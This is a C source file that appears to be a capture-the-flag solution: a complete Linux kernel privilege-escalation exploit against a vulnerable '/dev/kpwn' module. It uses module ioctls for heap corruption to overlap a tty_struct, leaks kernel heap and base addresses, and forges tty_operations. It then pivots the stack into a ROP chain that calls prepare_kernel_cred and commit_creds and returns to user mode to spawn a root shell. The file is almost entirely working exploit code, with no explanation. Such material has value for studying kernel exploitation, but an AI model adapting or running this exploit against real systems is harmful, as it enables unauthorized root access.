#include <linux/tty.h>
#include <linux/types.h>
#include <linux/kernel.h>
#include <linux/fs.h>
#include <linux/errno.h>
#include <unistd.h>
#include <fcntl.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <sys/ioctl.h>
#include <sys/mman.h>
#define ll long long

struct tty_operations
{
    struct tty_struct *(*lookup)(struct tty_driver *, struct file *, int); /*     0     8 */
    int (*install)(struct tty_driver *, struct tty_struct *);              /*     8     8 */
    void (*remove)(struct tty_driver *, struct tty_struct *);              /*    16     8 */
    int (*open)(struct tty_struct *, struct file *);                       /*    24     8 */
    void (*close)(struct tty_struct *, struct file *);                     /*    32     8 */
    void (*shutdown)(struct tty_struct *);                                 /*    40     8 */
    void (*cleanup)(struct tty_struct *);                                  /*    48     8 */
    int (*write)(struct tty_struct *, const unsigned char *, int);         /*    56     8 */
    /* --- cacheline 1 boundary (64 bytes) --- */
    int (*put_char)(struct tty_struct *, unsigned char);                            /*    64     8 */
    void (*flush_chars)(struct tty_struct *);                                       /*    72     8 */
    int (*write_room)(struct tty_struct *);                                         /*    80     8 */
    int (*chars_in_buffer)(struct tty_struct *);                                    /*    88     8 */
    int (*ioctl)(struct tty_struct *, unsigned int, long unsigned int);             /*    96     8 */
    long int (*compat_ioctl)(struct tty_struct *, unsigned int, long unsigned int); /*   104     8 */
    void (*set_termios)(struct tty_struct *, struct ktermios *);                    /*   112     8 */
    void (*throttle)(struct tty_struct *);                                          /*   120     8 */
    /* --- cacheline 2 boundary (128 bytes) --- */
    void (*unthrottle)(struct tty_struct *);           /*   128     8 */
    void (*stop)(struct tty_struct *);                 /*   136     8 */
    void (*start)(struct tty_struct *);                /*   144     8 */
    void (*hangup)(struct tty_struct *);               /*   152     8 */
    int (*break_ctl)(struct tty_struct *, int);        /*   160     8 */
    void (*flush_buffer)(struct tty_struct *);         /*   168     8 */
    void (*set_ldisc)(struct tty_struct *);            /*   176     8 */
    void (*wait_until_sent)(struct tty_struct *, int); /*   184     8 */
    /* --- cacheline 3 boundary (192 bytes) --- */
    void (*send_xchar)(struct tty_struct *, char);                           /*   192     8 */
    int (*tiocmget)(struct tty_struct *);                                    /*   200     8 */
    int (*tiocmset)(struct tty_struct *, unsigned int, unsigned int);        /*   208     8 */
    int (*resize)(struct tty_struct *, struct winsize *);                    /*   216     8 */
    int (*set_termiox)(struct tty_struct *, struct termiox *);               /*   224     8 */
    int (*get_icount)(struct tty_struct *, struct serial_icounter_struct *); /*   232     8 */
    const struct file_operations *proc_fops;                                 /*   240     8 */
 
    /* size: 248, cachelines: 4, members: 31 */
    /* last cacheline: 56 bytes */
};
unsigned long user_cs, user_ss, user_rflags;
struct ctf {
  ll a, b, c;
};

typedef int __attribute__((regparm(3))) (*_commit_creds)(unsigned long cred);
typedef unsigned long __attribute__((regparm(3))) (*_prepare_kernel_cred)(unsigned long cred);
_commit_creds commit_creds = 0x04f210;
_prepare_kernel_cred prepare_kernel_cred = 0x04f050;
void set_uid()
{
    char* (*pkc)(int) = prepare_kernel_cred;
    void (*cc)(char*) = commit_creds;
    (*cc)((*pkc)(0));
}
void get_shell(){
    system("/bin/sh;");
}
static void save_state() {
    asm(
        "movq %%cs, %0\n"
        "movq %%ss, %1\n"
        "pushfq\n"
        "popq %2\n" : "=r"(user_cs), "=r"(user_ss), "=r"(user_rflags) : : "memory"
    );
}

void alloc(int fd) {
  ioctl(fd, 0x1336, 0);  
}
void set_x(int fd, int a, int b) {
  struct ctf c = {a, b};
  ioctl(fd, 0x1337, &c);
}
void set_big_master(int fd, int x) {
  ioctl(fd, 0x1338, x);
}
void set_normal(int fd, int x) {
  ioctl(fd, 0x1339, x);
}
void copy_to_heap(int fd, int idx, char* buf, int len) {
  struct ctf c = {idx, buf, len};
  ioctl(fd, 0x133a, &c);
}
void copy_from_heap(int fd, int idx, char* buf, int len) {
  struct ctf c = {idx, buf, len};
  ioctl(fd, 0x133b, &c);
}
void free_heap(int fd, int x) {
  ioctl(fd, 0x133c, x);
}
void free_gg(int fd, int a, int b, int c) {
  struct ctf d = {a, b, c};
  ioctl(fd, 0x133d, &d);
}
void hex_print(unsigned char* buf, int len) {
    int i, j;
    for (i = 0; i < len / 16; i++) {
        for (j = 0; j < 16; j++) {
            printf("%02x ", (unsigned char)buf[i*16+j]);
        }
        printf("\n");
    }
}

int main() {
  int fd1 = open("/dev/kpwn", O_RDONLY);
  int i ;
  unsigned long lower_addr,base;
  ll xchg_eax_esp,pop_rax,swapgs,iretq,native_write_cr4,lea_rsp_r10,pop_rsp,set_memory_x,call_rax,jump_rax,pop_rdi,cmovs_rdi_rax,xor_rdi_rax;
  save_state();
  for (i = 0; i < 3; i++) {
    alloc(fd1);
  }
  set_big_master(fd1, 0);
  set_x(fd1, 0, 1);
  set_x(fd1, 0, 2);
  set_normal(fd1, 0);
  set_big_master(fd1, 1);
  copy_to_heap(fd1, 1, "AAAAAA", 6);
  copy_to_heap(fd1, 2, "BBBBBB", 6);
  char buf[1024];
  char buf2[0x400];
  copy_from_heap(fd1, 2, buf, 10);
  puts(buf);
  free_gg(fd1, 1, 0, 2);
  int fd2 = open("/dev/ptmx", O_RDWR);
  puts("ptmx");
  memset(buf, 0, 1024);
  copy_from_heap(fd1, 2, buf, 0x300);
  // hex_print(buf, 0x300);
  unsigned ll kernel_heap = *(unsigned ll *)(buf+0x38) - 0x38;
  printf("Kernel heap %llx\n", kernel_heap);
  unsigned ll kernel_base = *(unsigned ll *)(buf+24) - 0x6280e0;
  printf("Kernel base %llx\n", kernel_base);
  unsigned ll mod_tree = kernel_base + 0x817000;
  printf("Mod tree %llx\n", mod_tree);
  alloc(fd1); // 3
  //alloc(fd1); // 4
  unsigned ll fake_tty_operations_addr = kernel_heap - 0x400;
  set_x(fd1, 1, 3);
  //set_x(fd1, 1, 4);
  struct tty_operations fake_tty_operations;
  memset(&fake_tty_operations, 0, sizeof(struct tty_operations));
  write(fd2,"AAAAAAAABBBBBBB",0x10);

  lea_rsp_r10 = kernel_base + 0x0172b1;        //0xffffffff810172b1: pop rbx; pop r10; pop rbp; lea rsp, [r10 - 8]; ret;
  set_memory_x = kernel_base + 0x031B40;
  call_rax = kernel_base + 0x001e86;        //0xffffffff81001e86: call rax;
  jump_rax = kernel_base + 0x00005b;        //0xffffffff8100005b: jmp rax;
  xchg_eax_esp = kernel_base + 0x0703bd;    //0xffffffff810703bd: xchg eax, esp; ret;

  fake_tty_operations.ioctl = set_memory_x;
  printf("fake_tty_operation.ioctl -> set_memory_x %llx\n",set_memory_x);
  fake_tty_operations.write = jump_rax;
  printf("fake_tty_operation.write -> jump_rax %llx\n",jump_rax);
  fake_tty_operations.lookup = 0x000006f0c3c74990;
  fake_tty_operations.install = 0x909090c3e3220f41;

  *(unsigned ll *)(buf+24) = fake_tty_operations_addr;
  set_normal(fd1, 1);
  set_big_master(fd1, 0);
  copy_to_heap(fd1, 1, &fake_tty_operations, 0x300);
  //getchar();
  set_normal(fd1, 0);
  set_big_master(fd1, 1);
  copy_to_heap(fd1, 2, buf, 0x300);
  pop_rax = kernel_base + 0x01c6d1;        //0xffffffff8101c6d1: pop rax; ret;
  swapgs = kernel_base + 0x200c2e;        //0xffffffff81200c2e: swapgs; popfq; pop rbp; ret;
  iretq = kernel_base + 0x01a306;        //0xffffffff8101a306: iretq; pop rbp; ret;
  native_write_cr4 = kernel_base + 0x01c96f;    //0xffffffff8101c96f: mov cr4, rax; push rcx; popfq; xor eax, eax; pop rbp; ret;
  pop_rsp = kernel_base + 0x402c94;        //0xffffffff81402c94: pop rsp; ret;
  pop_rdi = kernel_base + 0x0354a0;        //0xffffffff810354a0: pop rdi; ret;
  cmovs_rdi_rax = kernel_base + 0x067f21;    //0xffffffff81067f21: cmovs rdi, rax; mov rax, rdi; ret;
  xor_rdi_rax = kernel_base + 0x0c3370;        //0xffffffff810c3370: xor rdi, rax; movabs rax, 0x61c8864680b583eb; ...; ret;
  prepare_kernel_cred += kernel_base;
  commit_creds += kernel_base;
  lower_addr = xchg_eax_esp & 0xFFFFFFFF;
  base = lower_addr & ~0xFFF;
  if (mmap(base, 0x30000, 7, MAP_PRIVATE | MAP_ANONYMOUS, -1, 0) != base)
  {
    perror("mmap");
    exit(1);
  }
  unsigned long rop_chain[]=
  {
    pop_rdi,
    0,
    prepare_kernel_cred,
    pop_rdi,
    0,
    xor_rdi_rax,
    0,
    commit_creds,
    swapgs,
    0, // rflags
    0,
    iretq,
    get_shell,
    user_cs,
    user_rflags,
    base + 0x10000,
    user_ss
  };
  memcpy(lower_addr, rop_chain, sizeof(rop_chain));
  ioctl(fd2,0x1000,0x10);
  write(fd2,"asdadsasd",10);
  fake_tty_operations.ioctl = xchg_eax_esp;
  set_normal(fd1, 1);
  set_big_master(fd1, 0);
  copy_to_heap(fd1, 1, &fake_tty_operations, 0x300);
  printf("fake_tty_operation.ioctl -> xchg_eax_esp %llx\n",xchg_eax_esp);
  getchar();
  ioctl(fd2,0,0);

  //getchar();
}